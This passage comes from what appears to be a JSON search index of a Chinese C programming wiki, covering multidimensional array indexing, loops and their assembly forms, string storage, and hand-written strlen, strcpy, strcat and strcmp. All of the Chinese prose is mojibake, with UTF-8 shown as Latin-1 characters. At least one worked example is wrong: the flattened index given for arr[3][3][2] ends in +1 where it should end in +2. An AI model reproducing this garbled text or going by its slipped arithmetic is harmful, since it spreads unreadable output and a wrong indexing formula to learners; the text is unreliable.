&#123;&#123;21, 22, 23&#125;, &#123;24, 25, 26&#125;, &#123;27, 28, 29&#125;, &#123;211, 212, 213&#125;&#125;, // 2 &#123;&#123;31, 32, 33&#125;, &#123;34, 35, 36&#125;, &#123;37, 38, 39&#125;, &#123;311, 312, 313&#125;&#125;, // 3 &#123;&#123;41, 42, 43&#125;, &#123;44, 45, 46&#125;, &#123;47, 48, 49&#125;, &#123;411, 412, 413&#125;&#125; // 4&#125;; éœ€æ±‚ ç¨‹åºå‘˜è§†è§’ ç¼–è¯‘å™¨å¦‚ä½•è®¡ç®— è·å–ç¬¬2ä¸ªç­çº§ã€ç¬¬3ç»„ã€ç¬¬2ä¸ªäººçš„å¹´é¾„ arr[1][2][1] arr[1*4*3+2*3+1]ã€‚å¤‡æ³¨ï¼š1ä¸ªç­çº§é‡Œæœ‰4ä¸ªç»„*3ä¸ªäººï¼›1ä¸ªç»„é‡Œæœ‰3ä¸ªäºº è·å–ç¬¬4ä¸ªç­çº§ã€ç¬¬4ç»„ã€ç¬¬3ä¸ªäººçš„å¹´é¾„ arr[3][3][2] arr[3*4*3+3*3+1] ç»¼ä¸Šï¼Œå¯¹äºä¸€ä¸ªå½¢å¼è¿™æ ·çš„å¤šç»´æ•°ç»„int arr[a][b][c][d][e]ï¼Œç¼–è¯‘å™¨åœ¨å¯»æ‰¾arr[2][3][4][2][2]æ˜¯è¿™æ ·ç®—çš„ï¼šarr[2bcde+3cde+4de+2e+2]"},{"title":"å¾ªç¯è¯­å¥","path":"/wiki/C/å¾ªç¯è¯­å¥.html","content":"å¾ªç¯è¯­å¥ å¾ªç¯è¯­å¥ while å¾ªç¯ 12345678while(è¡¨è¾¾å¼) è¯­å¥; while(è¡¨è¾¾å¼)&#123; è¯­å¥; è¯­å¥;&#125; do...while å¾ªç¯ 12345do&#123; è¯­å¥;&#125;while(è¡¨è¾¾å¼); ç‰¹ç‚¹ï¼šå…ˆæ‰§è¡Œä¸€æ¬¡ï¼Œå†åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦æˆç«‹ for å¾ªç¯ 1234for(è¡¨è¾¾å¼1;è¡¨è¾¾å¼2;è¡¨è¾¾å¼3)&#123; è¯­å¥; // éœ€è¦æ‰§è¡Œçš„ä»£ç 4&#125; å†³å®šå¾ªç¯ä½“æ˜¯å¦æ‰§è¡Œçœ‹çš„æ˜¯è¡¨è¾¾å¼2ï¼Œæ‰€ä»¥è¡¨è¾¾å¼2éœ€è¦æœ‰å¸ƒå°”å€¼ æ‰§è¡Œé€»è¾‘ï¼šæ‰§è¡Œè¡¨è¾¾å¼1-&gt;åˆ¤æ–­è¡¨è¾¾å¼2æ˜¯å¦æˆç«‹ å¦‚æœæˆç«‹ï¼Œæ‰§è¡Œè¯­å¥-&gt;æ‰§è¡Œè¡¨è¾¾å¼3-&gt;åˆ¤æ–­è¡¨è¾¾å¼2æ˜¯å¦æˆç«‹-&gt;â€¦ å¦‚æœä¸æˆç«‹ï¼Œä¸æ‰§è¡Œè¯­å¥-&gt;æ‰§è¡Œè¡¨è¾¾å¼3-&gt;åˆ¤æ–­è¡¨è¾¾å¼2æ˜¯å¦æˆç«‹-&gt;â€¦ æ‰§è¡Œé¡ºåºï¼š1-&gt;243â†’243â†’243â€¦ç›´è‡³è¡¨è¾¾å¼2ä¸æˆç«‹ï¼Œå¾ªç¯ç»“æŸ è¯æ˜forå¾ªç¯è¡¨è¾¾å¼çš„æ‰§è¡Œé¡ºåº1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt; void T1()&#123; printf(&quot;T1 &quot;);&#125;int T2()&#123; printf(&quot;T2 &quot;); return -1;&#125;void T3()&#123; printf(&quot;T3 &quot;);&#125;void T4()&#123; printf(&quot;T4 &quot;);&#125; void main()&#123; for(T1();T2();T3()) &#123; T4(); &#125; return;&#125; è¡¨è¾¾å¼å¯ä»¥çœç•¥ä¸å†™ã€‚è¡¨è¾¾å¼2ä¸å†™ï¼Œä¸ºçœŸ 123456789101112for(;;)&#123; printf(&quot;é»˜è®¤æˆç«‹ &quot;);&#125;for(;-1;)&#123; printf(&quot;é0æˆç«‹ &quot;);&#125;for(;0;)&#123; printf(&quot;0ä¸æˆç«‹ &quot;);&#125; ç¬¬1å’Œç¬¬3ä¸ªè¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨é€—å· 1234567int i;int j;int z;for (i = 0, j = 0, z = 0; i &lt; 10; i++, j++, z++)&#123; printf(&quot;%d %d %d &quot;, i, j, z);&#125; breakå’Œcontinue breakå’Œcontinueéƒ½æ˜¯å¾ªç¯æ§åˆ¶è¯­å¥ï¼Œä½†å®ƒä»¬çš„ä½œç”¨æ˜¯ä¸åŒçš„ã€‚breakè¯­å¥ç”¨äºç«‹å³ç»“æŸå½“å‰çš„æ•´ä¸ªå¾ªç¯ç»“æ„ï¼ŒåŒ…æ‹¬forã€whileå’Œdo-whileå¾ªç¯ï¼Œå¯¹ifè¯­å¥æ²¡ç”¨ã€‚å®ƒå°†æ§åˆ¶æƒè½¬ç§»åˆ°å¾ªç¯å—çš„ä¸‹ä¸€æ¡è¯­å¥ã€‚ continueè¯­å¥ç”¨äºç»“æŸå½“å‰å¾ªç¯ä¸­çš„å‰©ä½™éƒ¨åˆ†ï¼Œç„¶åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚å®ƒä¸ä¼šç»“æŸæ•´ä¸ªå¾ªç¯ï¼Œåªæ˜¯è·³è¿‡å½“å‰å¾ªç¯çš„å‰©ä½™éƒ¨åˆ†ã€‚ breakçš„ä¾‹å­ 1234567891011#include &lt;stdio.h&gt;int main() &#123; for(int i = 0; i &lt; 10; i++) &#123; if(i == 5) &#123; break; &#125; printf(&quot;%d &quot;, i); &#125; return 0;&#125; å½“iç­‰äº5æ—¶ï¼Œbreakè¯­å¥æ‰§è¡Œï¼Œæ•´ä¸ªforå¾ªç¯ç«‹å³ç»“æŸã€‚æ‰€ä»¥ï¼Œè¾“å‡ºç»“æœæ˜¯ï¼š0 1 2 3 4ã€‚ continueçš„ä¾‹å­ 1234567891011#include &lt;stdio.h&gt;int main() &#123; for(int i = 0; i &lt; 10; i++) &#123; if(i == 5) &#123; continue; &#125; printf(&quot;%d &quot;, i); &#125; return 0;&#125; å½“iç­‰äº5æ—¶ï¼Œcontinueè¯­å¥æ‰§è¡Œï¼Œå½“å‰çš„å¾ªç¯ä¼šè¢«è·³è¿‡ï¼Œç„¶åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚æ‰€ä»¥ï¼Œè¾“å‡ºç»“æœæ˜¯ï¼š0 1 2 3 4 6 7 8 9ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå½“iç­‰äº5æ—¶ï¼Œæ²¡æœ‰è¾“å‡ºï¼Œå› ä¸ºcontinueè¯­å¥è·³è¿‡äº†æ‰“å°è¯­å¥ã€‚ æ€»çš„æ¥è¯´ï¼Œbreakç”¨äºå®Œå…¨ç»“æŸå¾ªç¯ï¼Œè€Œcontinueç”¨äºè·³è¿‡å½“å‰å¾ªç¯çš„å‰©ä½™éƒ¨åˆ†ï¼Œç„¶åå¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚ åæ±‡ç¼– doå¾ªç¯ gotoè¯­å¥å¯ä»¥æ¨¡æ‹Ÿdoå¾ªç¯ç»“æ„ ä¾‹ï¼šç”¨gotoè¯­å¥æ‰“å°0-Nçš„å€¼ã€‚ ä¸‹è¿°ä»£ç å…¶å®å°±æ˜¯æ±‡ç¼–æ­£å‘å¼€å‘ä¸­å†™å¾ªç¯çš„æ–¹æ³• 1234567891011121314151617#include &lt;stdio.h&gt; void MyPrint(int x)&#123; int i = 0;B: printf(&quot;%d &quot;,i); i++; if(i&lt;=x) goto B;&#125;int main()&#123; MyPrint(10); return 0;&#125; gotoå°±æ˜¯æ±‡ç¼–ä¸­çš„jmp do while 1234DO_BEGIN: ...... ;å¾ªç¯è¯­å¥å— ;å½±å“æ ‡è®°ä½çš„æŒ‡ä»¤ jxx DO_BEGIN ;å‘ä¸Šè·³è½¬ ç”¨çš„jxxå’Œæºç é€»è¾‘ç›¸åŒï¼Œè¿™ä¸ifä¸åŒï¼Œifçš„æ˜¯ç›¸åçš„ while 123456WHILE_BEGIN: ;å½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx WHILE_END ;æ¡ä»¶æˆç«‹è·³è½¬åˆ°å¾ªç¯è¯­å¥å—ç»“å°¾å¤„ ...... jmp WHILE_BEGIN ;è·³è½¬åˆ°æ¡ä»¶æ¯”è¾ƒå¤„ WHILE_END: for"},{"title":"æŒ‡é’ˆä¸å­—ç¬¦ä¸²","path":"/wiki/C/æŒ‡é’ˆä¸å­—ç¬¦ä¸².html","content":"å­—ç¬¦ä¸²çš„ä¸‰ç§è¡¨ç°å½¢å¼ %sï¼šæ‰“å°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‡â€™/0â€™æˆ–0åœæ­¢ å½¢å¼ä¸€ï¼šchar str[6] = &#123;'A', 'B', 'C', 'D', 'E'&#125;; å½¢å¼äºŒï¼šchar str[] = &quot;ABCDE&quot;; å½¢å¼ä¸‰ï¼šchar *str = &quot;ABCDE&quot;; å­—ç¬¦æ•°ç»„å­—ç¬¦ä¸²å­—ç¬¦ä¸²æŒ‡é’ˆ1char str[6] = &#123;&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;&#125;; è¿™æ¡è¯­å¥å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œæ•°ç»„çš„å¤§å°æ˜¯6ä¸ªå­—ç¬¦ã€‚å®ƒæ˜¾å¼åœ°åŒ…å«äº†6ä¸ªå­—ç¬¦ï¼Œæ²¡æœ‰åŒ…å«ç©ºå­—ç¬¦(â€˜\\0â€™)ï¼Œè¿™æ„å‘³ç€å®ƒä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå°è¯•ä½¿ç”¨åƒprintf(â€œ%sâ€, str);è¿™æ ·çš„å­—ç¬¦ä¸²å‡½æ•°æ¥æ‰“å°å®ƒï¼Œå¯èƒ½ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œå› ä¸ºå‡½æ•°ä¼šç»§ç»­è¯»å–å†…å­˜ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ã€‚ å¯¹æ¯ä¸ªå­—ç¬¦æŸ¥ASCIIè¡¨ï¼Œå°†æŸ¥è¡¨åå¾—åˆ°çš„æ•°å€¼å­˜åˆ°å®šä¹‰çš„å±€éƒ¨å˜é‡ä¸­1char str[] = &quot;ABCDE&quot;; è¿™æ¡è¯­å¥å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œå¹¶è‡ªåŠ¨è®¡ç®—æ•°ç»„çš„å¤§å°ä¸º6ä¸ªå­—ç¬¦ï¼ˆåŒ…æ‹¬æœ€åçš„ç©ºå­—ç¬¦â€™\\0â€™ï¼‰ã€‚è¿™æ˜¯ä¸€ä¸ªä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å®‰å…¨åœ°ç”¨åœ¨æ‰€æœ‰æœŸæœ›å­—ç¬¦ä¸²çš„æ ‡å‡†Cå‡½æ•°ä¸­ã€‚ ç¼–è¯‘å™¨å…ˆåœ¨å¸¸é‡åŒºæ‰¾ä¸€å—ç©ºé—´ï¼Œå­˜&quot;ABCDE&quot;è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åå°†å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ•°ç»„ä¸­ï¼ˆçœ‹æ±‡ç¼–ä»£ç ï¼Œé€šè¿‡eaxç§»åŠ¨4ä¸ªå­—èŠ‚ï¼Œç„¶åcxç§»å­—ç¬¦Eå’Œç»“æŸç¬¦0è¿™ä¸¤ä¸ªå­—èŠ‚ï¼‰ã€‚å¤åˆ¶åˆ°æ•°ç»„åæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œè¯»å†™ã€‚ å¦‚ 12char str[] = &quot;ABCDE&quot;;str[0] = &#x27;K&#x27;; å…ˆåœ¨å¸¸é‡åŒºæ‰¾ä¸€å—ç©ºé—´å­˜è¿™ä¸ªå­—ç¬¦ä¸²çš„å¥½å¤„æ˜¯ï¼Œå½“ä»¥åè¿˜ç”¨åˆ°è¿™ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œå°±ä¸ç”¨å†åˆ†é…ç©ºé—´ï¼Œå¸¸é‡åŒºä¸­å·²ç»æœ‰äº†ã€‚1char *str = &quot;ABCDE&quot;; //å¸¸é‡åŒºï¼Œåªèƒ½è¯»ä¸èƒ½å†™ è¿™æ¡è¯­å¥å®šä¹‰äº†ä¸€ä¸ªæŒ‡å‘å­—ç¬¦çš„æŒ‡é’ˆï¼Œå¹¶å°†å®ƒåˆå§‹åŒ–ä¸ºæŒ‡å‘å­—ç¬¦ä¸²å¸¸é‡&quot;ABCDE&quot;çš„åœ°å€ã€‚å­—ç¬¦ä¸²å¸¸é‡é€šå¸¸å­˜å‚¨åœ¨ç¨‹åºçš„åªè¯»æ•°æ®æ®µï¼Œè¿™æ„å‘³ç€ä½ ä¸åº”è¯¥å°è¯•ä¿®æ”¹å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œå¦‚str[0] = â€˜Xâ€™;è¿™æ ·çš„æ“ä½œç¼–è¯‘è™½ç„¶å¯ä»¥é€šè¿‡ï¼Œä½†æ‰§è¡ŒæŠ¥0xC0000005çš„é”™è¯¯ã€‚å’Œç¬¬äºŒæ¡è¯­å¥ä¸€æ ·ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ä¹Ÿæ˜¯ä»¥ç©ºå­—ç¬¦ç»“å°¾ã€‚ æ±‡ç¼–æŒ‡ä»¤ï¼Œå¯ä»¥çœ‹åˆ°å–è¯¥å­—ç¬¦ä¸²èµ·å§‹åœ°å€ç»™æŒ‡é’ˆå˜é‡ ç”¨&quot;ABCDE&quot;è¿™ç§å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åœ¨æœ«å°¾å¡«0åšä¸ºå­—ç¬¦ä¸²çš„ç»“æŸæ ‡è®°ã€‚å†™å­—ç¬¦æ•°ç»„ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨æ·»é›¶ï¼Œå¦‚ä¸‹ä¸¤ç§æ˜¯ä¸€æ ·çš„ï¼š 12345char arr[6] = &#123;&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;\\0&#x27;&#125;; // ä¹Ÿå¯ä»¥ç›´æ¥å†™ 0char names[] = &quot;ABCDE&quot;;printf(&quot;%s &quot;, arr);printf(&quot;%s &quot;, names); å­—ç¬¦ä¸²èƒ½å¦ä¿®æ”¹çš„é—®é¢˜ å†…å­˜åˆ†å¸ƒå›¾ 123456789 ---------------| ä»£ç åŒº | ä»£ç  ---------------| æ ˆ | å‚æ•°ï¼Œå±€éƒ¨å˜é‡ ---------------| å…¨å±€å˜é‡ | å…¨å±€å˜é‡ å¯è¯»ï¼Œå¯å†™ ---------------| å¸¸é‡åŒº | å¸¸é‡åŒº å¯è¯»ï¼Œä¸å¯å†™ --------------- ä¾‹1 xå­˜çš„æ˜¯å¸¸é‡åŒºä¸­â€œchinaâ€å­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼Œå¸¸é‡åŒºä¸å¯å†™ï¼Œä¸èƒ½é€šè¿‡æŒ‡é’ˆæ¥ä¿®æ”¹å®ƒã€‚ yå­—ç¬¦æ•°ç»„æ˜¯å°†å¸¸é‡åŒºçš„â€œchinaâ€æ‹·è´ä¸€ä»½åˆ°æ ˆä¸­ï¼ˆå±€éƒ¨å˜é‡ï¼‰ï¼Œåœ¨æ ˆä¸­å¯è¯»å¯å†™ 123456789char* x = &quot;china&quot;;char y[] = &quot;china&quot;;void Function()&#123; *(x + 1) = &#x27;A&#x27;; //ç¼–è¯‘èƒ½é€šè¿‡ï¼Œæ‰§è¡ŒæŠ¥é”™0xC0000005 y[1] = &#x27;A&#x27;; //ç¼–è¯‘èƒ½é€šè¿‡ï¼Œä¹Ÿèƒ½æ‰§è¡Œ&#125; ä¾‹2 12345678void Function()&#123; char *x = &quot;china&quot;; // è¿˜æ˜¯åœ¨å¸¸é‡åŒº char y[] = &quot;china&quot;; *(x + 1) = &#x27;A&#x27;; // ç¼–è¯‘èƒ½é€šè¿‡ï¼Œæ‰§è¡ŒæŠ¥é”™0xC0000005 y[1] = &#x27;A&#x27;; // ç¼–è¯‘èƒ½é€šè¿‡ï¼Œä¹Ÿèƒ½æ‰§è¡Œ&#125; å¸¸ç”¨çš„å­—ç¬¦ä¸²å‡½æ•° å¤´æ–‡ä»¶#include &lt;string.h&gt; 1234int strlen(char *s); // è¿”å›ç±»å‹æ˜¯å­—ç¬¦ä¸²sçš„é•¿åº¦ï¼Œä¸åŒ…å«ç»“æŸç¬¦å·\\0char* strcpy(char *dest, char *src); // å¤åˆ¶å­—ç¬¦ä¸²srcåˆ°destä¸­ï¼Œè¿”å›æŒ‡é’ˆä¸ºdestçš„å€¼char* strcat(char *dest, char *src); // å°†å­—ç¬¦ä¸²srcæ·»åŠ åˆ°destå°¾éƒ¨ï¼Œè¿”å›æŒ‡é’ˆä¸ºdestçš„å€¼int strcmp(char *s1, char *s2); // æ¯”è¾ƒs1å’Œs2ï¼Œä¸€æ ·åˆ™è¿”å›0ï¼Œä¸ä¸€æ ·è¿”å›é0 ä¸‹é¢æ¥è‡ªå·±å®ç°ä»¥ä¸Šçš„å‡½æ•° å‚è€ƒï¼šé¢è¯•é¢˜ä¹‹strcpy/strlen/strcat/strcmpçš„å®ç° å¦‚ä½•å®ç°ä¸€ä¸ªæ»¡åˆ†çš„strcpyå‡½æ•°ï¼Ÿ To doï¼šæ–­è¨€ strlenå‡½æ•° å‚è€ƒï¼šhttps://zhuanlan.zhihu.com/p/435423218 å¸¸è§„åšæ³•æŒ‡é’ˆç›¸å‡åœ¨Cè¯­è¨€ä¸­ï¼Œåç¼€é€’å¢ï¼ˆ++ï¼‰çš„ä¼˜å…ˆçº§é«˜äºè§£å¼•ç”¨ï¼ˆ*ï¼‰ï¼Œä½†æ˜¯åç¼€é€’å¢æ˜¯ä¸€ä¸ªâ€œå‰¯ä½œç”¨â€æ“ä½œï¼Œå…¶å¢åŠ æŒ‡é’ˆçš„å€¼çš„æ•ˆæœä¼šåœ¨è¡¨è¾¾å¼çš„å€¼è¢«ä½¿ç”¨åå‘ç”Ÿã€‚ *str++å…ˆå¯¹æŒ‡é’ˆsè§£å¼•ç”¨å–å®ƒæŒ‡å‘çš„å€¼ï¼Œç„¶åæŒ‡é’ˆs++ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼›*++strå…ˆæŒ‡é’ˆ++ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åæŒ‡é’ˆsè§£å¼•ç”¨å–å®ƒæŒ‡å‘çš„å€¼ã€‚ 123456789size_t my_strlen(const char* str)&#123; int count = 0; while (*str++) &#123; count++; &#125; return count;&#125;1234567891011size_t my_strlen(const char* str)&#123; const char* start = str; // å­—ç¬¦ä¸²èµ·å§‹ä½ç½® const char* end = str; while (*end != &#x27;\\0&#x27;) &#123; end++; &#125; //å½“*end=&#x27;\\0&#x27;æ—¶ï¼Œé€€å‡ºwhileå¾ªç¯ //æ­¤æ—¶endæŒ‡å‘ç»“æŸæ ‡å¿—çš„å‰ä¸€ä¸ªå­—ç¬¦ return end - start; //ç›¸å‡ï¼Œå¾—åˆ°é•¿åº¦&#125; 123456 A B C D E \\0whileå¾ªç¯å‰ï¼š start endç»“æŸå¾ªç¯ï¼š start end ç²¾ç®€ä¸€ä¸‹ä»£ç ï¼Œå˜ä¸º 12345678size_t my_strlen(const char* str)&#123; const char* end = str; while (*end++); //å½“*end=&#x27;\\0&#x27;æ—¶ï¼Œé€€å‡ºwhileå¾ªç¯ //æ­¤æ—¶endæŒ‡å‘ç»“æŸæ ‡å¿— return end-str-1; //ç›¸å‡ï¼Œå†å‡1ï¼Œå¾—åˆ°é•¿åº¦&#125; *end++ï¼ŒendæŒ‡å‘çš„å­—ç¬¦å¦‚æœä¸æ˜¯0ï¼Œend++ï¼Œå½“*end='\\0â€™æ—¶ï¼Œwhileå¾ªç¯ç»“æŸï¼Œæ­¤æ—¶endæŒ‡å‘ç»“æŸæ ‡å¿—ã€‚æœ€åç›¸å‡æ—¶è¦å¤šå‡1 123456 A B C D E \\0whileå¾ªç¯å‰ï¼š start endç»“æŸå¾ªç¯ï¼š start end srcæ–‡ä»¶å¤¹ä¸­çš„ strlen.c ï¼šï¼ˆå’Œä¸Šé¢çš„ä»£ç åŸç†ä¸€æ ·ï¼Œåªæ˜¯å˜é‡åä¸åŒï¼‰ 12345678910size_t __cdecl strlen ( const char * str )&#123; const char *eos = str; while( *eos++ ) ; return( eos - str - 1 );&#125; strcpyå‡½æ•° å‰æï¼šdeså’Œsrcæ‰€æŒ‡å†…å­˜åŒºåŸŸä¸å¯ä»¥é‡å ä¸”deså¿…é¡»æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å®¹çº³srcçš„å­—ç¬¦ä¸² æµ‹è¯•å‡½æ•° 12345678910#include &quot;stdafx.h&quot;int main()&#123; char x[] = &quot;china&quot;; char y[] = &quot;XYZ&quot;; strcpy(x, y); printf(&quot;%s&quot;, x); return 0;&#125; 1234567891011121314char* strcpy(char* des, const char* src)&#123; char* ret = des; // å­˜ç›®çš„ä¸²çš„é¦–åœ°å€ while (*src!=&#x27;\\0&#x27;) &#123; *des=*src; src++; des++; &#125; *des=&#x27;\\0&#x27;; return ret;&#125; 1234567891011121314151617whileå¾ªç¯å‰ï¼š c h i n a \\0 des src X Y Z \\0 ç»“æŸå¾ªç¯ï¼š X Y Z n a \\0 des src X Y Z \\0ç»™desåŠ \\0ï¼š X Y Z \\0 a \\0 des src X Y Z \\0 ç®€æ´ç‚¹ 123456789char* strcpy(char* des, const char* src)&#123; char* ret = des; // å­˜ç›®çš„ä¸²çš„é¦–åœ°å€ while (*des++ =* src++) ; return ret;&#125; æ‰§è¡Œé¡ºåºæœ‰ç‚¹æ··ä¹±çš„è¯ï¼Œå¯ä»¥çœ‹æ±‡ç¼–æ¥çŸ¥é“ whileå¾ªç¯ï¼Œå…ˆçœ‹è¡¨è¾¾å¼æ˜¯å¦æˆç«‹ï¼Œå› ä¸ºè¿™ä¸ªè¡¨è¾¾å¼æ˜¯ä¸ªèµ‹å€¼è¡¨è¾¾å¼ï¼Œèµ‹å€¼è¡¨è¾¾å¼çš„ç»“æœæ˜¯åˆ†é…ç»™å·¦æ“ä½œæ•°çš„å€¼ï¼Œæ‰€ä»¥å…ˆæ‰§è¡Œèµ‹å€¼è¡¨è¾¾å¼ï¼Œå¾—åˆ°è¡¨è¾¾å¼çš„ç»“æœï¼Œæ‰èƒ½åˆ¤æ–­whileå¾ªç¯è¦æ‰§è¡Œè¿˜æ˜¯ä¸æ‰§è¡Œã€‚ 1234567whileå¾ªç¯ï¼š *des=*str èµ‹å€¼è¡¨è¾¾å¼çš„ç»“æœæ˜¯*des éšåï¼Œstr++ï¼Œdes++ èµ‹å€¼è¡¨è¾¾å¼çš„ç»“æœæ˜¯0å— å¦‚æœæ˜¯ï¼Œç»“æŸwhileå¾ªç¯ å¦‚æœä¸æ˜¯ï¼Œç»§ç»­whileå¾ªç¯ 1234567891011121314151617181920212223242526272815: char* ret = des; // å­˜ç›®çš„ä¸²çš„é¦–åœ°å€00401038 mov eax,dword ptr [ebp+8]0040103B mov dword ptr [ebp-4],eax //å±€éƒ¨å˜é‡ret=[ebp+8]ï¼šdesä¸²çš„åœ°å€16:17: while (*des++ =* src++)0040103E mov ecx,dword ptr [ebp+8] //ecx=[ebp+8]ï¼šdesä¸²çš„åœ°å€00401041 mov edx,dword ptr [ebp+0Ch] //edx=[ebp+0Ch]ï¼šsrcä¸²çš„åœ°å€00401044 mov al,byte ptr [edx]00401046 mov byte ptr [ecx],al //*des=*src00401048 mov ecx,dword ptr [ebp+8]0040104B movsx edx,byte ptr [ecx] //å–*desï¼Œå¹¶å¸¦ç¬¦å·æ‹“å±•0040104E mov eax,dword ptr [ebp+8] //des++00401051 add eax,100401054 mov dword ptr [ebp+8],eax00401057 mov ecx,dword ptr [ebp+0Ch] //src++0040105A add ecx,10040105D mov dword ptr [ebp+0Ch],ecx00401060 test edx,edx //edxæ˜¯*des,åˆ¤æ–­whileè¡¨è¾¾å¼æ˜¯å¦ä¸º000401062 je strcpy+46h (00401066) //ä¸º0ï¼Œç»“æŸwhileå¾ªç¯ 18: ;00401064 jmp strcpy+1Eh (0040103e) //å¦åˆ™ï¼Œç»§ç»­whileå¾ªç¯19:20: return ret;00401066 mov eax,dword ptr [ebp-4] strcatå‡½æ•° å‰æï¼šdes å’Œ src æ‰€æŒ‡å†…å­˜åŒºåŸŸä¸å¯ä»¥é‡å ä¸” des å¿…é¡»æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å®¹çº³ src çš„å­—ç¬¦ä¸² 12345678910111213 while (*des++) //è¿™ä¸ªå†™æ³•æœ‰é—®é¢˜ ; å–desçš„å€¼ï¼Œç„¶ådes++ï¼Œ*desæ˜¯å¦=0ï¼Ÿ ç­‰äº0ï¼Œç»“æŸwhileå¾ªç¯ ä¸ç­‰äº0ï¼Œç»§ç»­desæŒ‡å‘aï¼Œ*des=aï¼Œç„¶ådes++ï¼Œ*desæ˜¯å¦=0ï¼Ÿä¸ç­‰äº0ï¼Œç»§ç»­desæŒ‡å‘0ï¼Œ*des=&#x27;\\0&#x27;ï¼Œç„¶ådes++ï¼Œ*desæ˜¯å¦=0ï¼Ÿç­‰äº0ï¼Œé€€å‡ºæ­¤æ—¶desæŒ‡å‘äº†&#x27;\\0&#x27;ä¸‹ä¸€ä¸ªå­—ç¬¦c h i n a 0 ? des 1234567891011121314char* strcat(char* des, const char* src)&#123; char* ret = des; // å­˜ç›®çš„ä¸²çš„é¦–åœ°å€ while (*des) //è®©desæŒ‡å‘&#x27;\\0&#x27; &#123; des++; &#125;; // æ‹·è´srcåˆ°desï¼Œå°±æ˜¯strcpyçš„å†…å®¹ while (*des++ =*src++) ; return ret;&#125; strcmpå‡½æ•° è‹¥s1==s2ï¼Œè¿”å›é›¶ï¼› è‹¥s1&gt;s2ï¼Œè¿”å›æ­£æ•°ï¼› è‹¥s1&lt;s2ï¼Œè¿”å›è´Ÿæ•°ã€‚ 123456789101112int strcmp(const char *s1,const char *s2)&#123; while(*s1 == *s2) //ç›¸ç­‰æ—¶æ‰è¿›å…¥whileå¾ªç¯ &#123; if(*s1 == &#x27;\\0&#x27;) //ç›¸ç­‰æ—¶è¿›çš„whileï¼ŒæŸä¸€ä¸ªä¸²æ­¤æ—¶çš„å­—ç¬¦æ˜¯\\0ï¼Œåˆ™ä¸¤ä¸ªä¸²ç›¸ç­‰ï¼Œè¿”å›0 return 0; s1++; s2++; &#125; return *s1 - *s2;&#125; 123456789s1&lt;s2ï¼šs1ï¼ša b c \\0s2: a b c d \\0*s1=c,*s2=cï¼Œç›¸ç­‰ï¼Œè¿›whileï¼Œs1å’Œs2éƒ½++ã€‚æ­¤æ—¶*s1=&#x27;\\0&#x27;ï¼Œ*s2=dï¼Œä¸ç›¸ç­‰ï¼Œé€€å‡ºwhileã€‚æ‰§è¡Œreturn *s1 - *s2;s1=s2ï¼šs1ï¼ša b c \\0s2: a b c \\0*s1=c,*s2=cï¼Œç›¸ç­‰ï¼Œè¿›whileï¼Œs1å’Œs2éƒ½++ã€‚æ­¤æ—¶*s1=&#x27;\\0&#x27;ï¼Œ*s2=&#x27;\\0&#x27;ï¼Œç›¸ç­‰ï¼Œè¿›whileã€‚ifè¯­å¥æˆç«‹ï¼Œreturn 0 åº“å‡½æ•°æºç åˆ†æ 1234567891011121314151617int __cdecl strcmp ( const char * src, const char * dst )&#123; int ret = 0 ; while( ! (ret = *(unsigned char *)src - *(unsigned char *)dst) &amp;&amp; *dst) ++src, ++dst; if ( ret &lt; 0 ) ret = -1 ; else if ( ret &gt; 0 ) ret = 1 ; return( ret );&#125; ä»£ç åˆ†æï¼š 1int ret = 0 ; //å­—ç¬¦ä¸²æ¯”è¾ƒç»“æœï¼Œé»˜è®¤ä¸¤ä¸²ç›¸ç­‰ï¼Œè¿”å›0 åœ¨æˆ‘ä¸Šé¢çš„å†™æ³•ï¼Œæ˜¯é€ä¸ªå­—ç¬¦å¯¹æ¯”æ˜¯å¦ç›¸ç­‰ï¼Œæ‰¾åˆ°ä¸ç›¸ç­‰çš„ä½ç½®ï¼Œå†ç›¸å‡ç»“æŸå‡½æ•°ã€‚ä½†å®é™…ä¸Šï¼Œå¯ä»¥ç›´æ¥è®©å®ƒä»¬ç›¸å‡ï¼Œç›¸å‡çš„ç»“æœå°±æ˜¯ä¸¤ä¸ªå­—ç¬¦æ¯”è¾ƒçš„ç»“æœï¼ŒçŸ¥é“å®ƒä»¬ç›¸ç­‰æˆ–ä¸ç›¸ç­‰ã€‚ å¦‚æœç›¸å‡çš„ç»“æœä¸º0ï¼Œä¸¤ä¸ªå­—ç¬¦å°±æ˜¯ç›¸åŒçš„ã€‚ 